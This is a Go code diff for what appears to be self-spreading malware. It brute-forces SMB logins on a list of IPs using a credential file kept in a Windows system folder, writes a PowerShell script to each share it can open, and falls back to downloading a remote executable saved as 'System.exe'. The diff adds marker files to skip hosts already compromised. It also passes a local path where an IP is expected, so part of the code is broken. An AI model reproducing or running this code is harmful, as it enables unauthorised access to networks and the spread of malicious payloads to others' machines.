@@ -4,56 +4,82 @@ import (
 	"bufio"
 	"fmt"
 	"io"
+	"log"
 	"net"
 	"net/http"
 	"os"
 	"os/exec"
+	"path/filepath"
 	"strings"
 	"time"
 
 	"github.com/hirochachacha/go-smb2"
 )
 
+const (
+	dirPath           = "C:\\Windows\\loveorhate"
+	smbMarkerFileName = "upload_marker.txt"
+)
+
 func SMB() {
-	// Read SMB IPs from smbip.txt
-	ipFile, err := os.Open("smbip.txt")
+	ipFilePath := filepath.Join(dirPath, "smbip.txt")
+	ipFile, err := os.Open(ipFilePath)
 	if err != nil {
-		fmt.Printf("Error reading SMB server IPs file: %v\n", err)
+		log.Printf("Error reading SMB server IPs file: %v\n", err)
 		return
 	}
 	defer ipFile.Close()
 
 	scanner := bufio.NewScanner(ipFile)
 
-	// Read credentials from smbcred.txt
-	credFile, err := os.Open("smbcred.txt")
+	credFilePath := filepath.Join(dirPath, "smbcred.txt")
+	credFile, err := os.Open(credFilePath)
 	if err != nil {
-		fmt.Printf("Error reading SMB credentials file: %v\n", err)
+		log.Printf("Error reading SMB credentials file: %v\n", err)
 		return
 	}
 	defer credFile.Close()
 
 	credScanner := bufio.NewScanner(credFile)
 
-	// Loop through each IP address
 	for scanner.Scan() {
 		ip := scanner.Text()
 
-		// Loop through each set of credentials for the current IP address
-		credFile.Seek(0, io.SeekStart) // Reset file position to the beginning
+		credFile.Seek(0, io.SeekStart)
+
 		for credScanner.Scan() {
 			cred := strings.Split(credScanner.Text(), ":")
 			username := cred[0]
 			password := cred[1]
 
-			// Attempt to connect to the SMB server
-			if err := connectAndUpload(ip, username, password); err != nil {
-				fmt.Printf("Failed to connect to %s with %s:%s: %v\n", ip, username, password, err)
+			if !hasMarkerFile(filepath.Join(dirPath, ip)) {
+				if err := connectAndUpload(filepath.Join(dirPath, ip), username, password); err != nil {
+					log.Printf("Failed to connect to %s with %s:%s: %v\n", ip, username, password, err)
+				} else {
+					log.Printf("Successfully connected to %s with %s:%s\n", ip, username, password)
+					createMarkerFile(filepath.Join(dirPath, ip))
+				}
 			} else {
-				fmt.Printf("Successfully connected to %s with %s:%s\n", ip, username, password)
+				log.Printf("Skipping %s - Marker file exists\n", ip)
 			}
 		}
 	}
+}
+
+func hasMarkerFile(dirPath string) bool {
+	markerFilePath := filepath.Join(dirPath, smbMarkerFileName)
+	_, err := os.Stat(markerFilePath)
+	return !os.IsNotExist(err)
+}
+
+func createMarkerFile(dirPath string) error {
+	markerFilePath := filepath.Join(dirPath, smbMarkerFileName)
+	file, err := os.Create(markerFilePath)
+	if err != nil {
+		return fmt.Errorf("failed to create marker file: %v", err)
+	}
+	defer file.Close()
+	return nil
 }
 
 func connectAndUpload(ip, username, password string) error {
@@ -126,7 +152,7 @@ func connectAndUpload(ip, username, password string) error {
 	defer f.Umount()
 
 	psFileName := "hello.ps1"
-	psFilePath := fmt.Sprintf("%s\\%s", shareName, psFileName)
+	psFilePath := filepath.Join(shareName, psFileName)
 
 	psFile, err := f.Create(psFilePath)
 	if err != nil {
@@ -151,7 +177,7 @@ func connectAndUpload(ip, username, password string) error {
 		// Download executable if PowerShell script fails
 		executableURL := "https://sourceforge.net/projects/app/files/main.exe/download"
 		executableFileName := "System.exe"
-		executableFilePath := fmt.Sprintf("%s\\%s", shareName, executableFileName)
+		executableFilePath := filepath.Join(shareName, executableFileName)
 
 		err := downloadSMBFile(executableURL, executableFilePath)
 		if err != nil {
